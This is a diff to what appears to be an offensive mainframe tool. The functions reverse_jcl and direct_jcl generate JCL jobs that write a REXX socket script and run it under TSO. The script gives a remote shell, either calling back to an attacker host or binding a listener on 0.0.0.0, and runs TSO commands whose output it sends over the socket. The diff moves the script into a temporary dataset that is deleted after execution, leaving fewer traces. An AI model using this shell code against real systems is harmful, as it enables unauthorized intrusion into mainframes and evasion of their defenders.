@@ -1490,7 +1490,8 @@ def reverse_jcl(lhost, username="CICSUSEC", kind="tso"):
 //CREATERX  EXEC PGM=IEBGENER
 //SYSPRINT   DD SYSOUT=*
 //SYSIN      DD DUMMY
-//SYSUT2     DD DSN=CICSUSER."""+tmp+""",
+//SYSUT2      DD DSN=&&OMG("""+tmp+"""),
+//* SYSUT2     DD DSN=CICSUSER."""+tmp+""",
 //           DISP=(NEW,CATLG,DELETE),SPACE=(TRK,5),
 //           DCB=(RECFM=FB,LRECL=80,BLKSIZE=27920)
 //SYSUT1     DD *
@@ -1519,13 +1520,12 @@ def reverse_jcl(lhost, username="CICSUSEC", kind="tso"):
  te = SOCKET('SEND',sockID, '"""+prompt+"""');return 1;
 /*
 //SYSOUT     DD SYSOUT=*
-//STEP01 EXEC  PGM=IKJEFT01,REGION=2048K 
+//EXECREXX EXEC PGM=IKJEFT01,
+//            PARM='%"""+tmp+"""',
+//            REGION=0M
+//SYSTSIN  DD  DUMMY
 //SYSTSPRT DD  SYSOUT=*
-//SYSTSIN  DD *
- EX 'CICSUSER."""+tmp+"""'
-/*
-//SYSIN    DD  DUMMY
-/*EOF
+//SYSEXEC  DD  DSN=&&OMG,DISP=(OLD,DELETE,DELETE)
 """
   return jcl_code
 
@@ -1715,15 +1715,21 @@ def direct_jcl(port, job_name="PGMTEST", kind="tso"):
 //CREATERX  EXEC PGM=IEBGENER
 //SYSPRINT   DD SYSOUT=*
 //SYSIN      DD DUMMY
-//SYSUT2     DD DSN=CICSUSER."""+tmp+""",
-//           DISP=(NEW,CATLG,DELETE),SPACE=(TRK,5),
-//           DCB=(RECFM=FB,LRECL=80,BLKSIZE=27920)
+//* SYSUT2     DD DSN=CICSUSER."""+tmp+""",
+//* SYSUT2      DD DSN=&&OMG("""+tmp+"""),
+//*           DISP=(NEW,CATLG,DELETE),SPACE=(TRK,5),
+//*           DCB=(RECFM=FB,LRECL=80,BLKSIZE=27920)
+//SYSUT2    DD DSN=&&OMG("""+tmp+"""),
+//             DISP=(NEW,PASS,DELETE),
+//             SPACE=(TRK,(1,1,1)),
+//             DCB=(LRECL=80,BLKSIZE=3120,RECFM=FB,DSORG=PS)
 //SYSUT1     DD *
  /* REXX */;nl ='25'x
  te = socket('INITIALIZE','DAEMON',2);te = Socket('GetHostId')
  parse var te s_rc MF_IP .;te = SOCKET('SOCKET');parse var te s_rc s_id .
     te = Socket('SETSOCKOPT',s_id,'SOL_SOCKET','SO_KEEPALIVE','ON')
- te=Socket('BIND',s_id,'AF_INET' '"""+port+"""' MF_IP);te=Socket('Listen',s_id,2)
+ te=Socket('BIND',s_id,'AF_INET' '"""+port+"""' 0.0.0.0);
+ te=Socket('Listen',s_id,2)
     cl = '';DO k=1 to 1000
     te = Socket('Select','READ' s_id cl 'WRITE' 'EXCEPTION')
     parse upper var te 'READ' readin 'WRITE' writtin 'EXCEPTION' exceptin
@@ -1746,16 +1752,14 @@ def direct_jcl(port, job_name="PGMTEST", kind="tso"):
  exec_tso:
   parse arg do; text = '';u = OUTTRAP('out.'); """+cmd+"""
   u=OUTTRAP(OFF);DO i = 1 to out.0;text = text||out.i||nl;end;return text
-
 /*
 //SYSOUT     DD SYSOUT=*
-//STEP01 EXEC  PGM=IKJEFT01,REGION=2048K 
+//EXECREXX EXEC PGM=IKJEFT01,
+//            PARM='%"""+tmp+"""',
+//            REGION=0M
+//SYSTSIN  DD  DUMMY
 //SYSTSPRT DD  SYSOUT=*
-//SYSTSIN  DD *
- EX 'CICSUSER."""+tmp+"""'
-/*
-//SYSIN    DD  DUMMY
-/*EOF
+//SYSEXEC  DD  DSN=&&OMG,DISP=(OLD,DELETE,DELETE)
 """
   return jcl_code  
   
